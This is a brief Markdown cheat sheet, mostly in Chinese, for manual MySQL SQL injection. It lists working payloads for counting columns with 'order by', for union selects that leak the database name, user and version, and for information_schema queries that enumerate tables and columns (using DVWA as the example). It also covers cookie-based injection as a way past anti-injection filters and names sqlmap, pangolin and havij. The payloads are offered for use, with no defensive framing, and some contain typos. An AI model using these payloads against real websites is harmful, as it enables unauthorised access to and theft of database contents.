# Mysql
Mysql above 5.0
Mysql under 5.0

## Inject
- 数值注入
- 字符注入
- 搜索型注入
select * from news where password like '%best%'
select * from news where password like '%best%'　union select 1, version(),2,3,4,5'%
可以打印 MySQL 版本号

## Inject a station

### order by
id=1' order by 8
进行测试数据库中的列数

### union
id=1' union select database(), user(), version()
可以显示出数据可以的数据库名字，使用用户，数据库版本


### look up root and password
id=1' union select group_concat(table_name) from information_schema.tables where table_schema=0x64767761
0x64767761 16 进制 转化后 是 该数据库的名字 dvwa
解释：查询 information_schema 库的 tables 表中，table_schema 中 dvwa 的 table_name 列的所有数据

information_schema.columns   表的列的信息
id=1' union select group_concat(column_name) from information_schema.columns where table_name=0x64767761


## boom database
schemata 查找数据库的名字
union select 1,schema_name form information_schema.schemata limit 0,1
limit a,b  a 开始  取 b 个数据


## cookies
有些网站会有防注入机制

一般 get post 都有防注入机制，但是 cookies 会很少有防注入机制
cookie:blah blah ;id=50' 如果报错 就是一个注入点
;id=50%20order%20by%2025
测试数据库的数据有多少


## cookies 注入 tools
中转工具
pangolin 穿山甲
havji
sqlmap  design by python
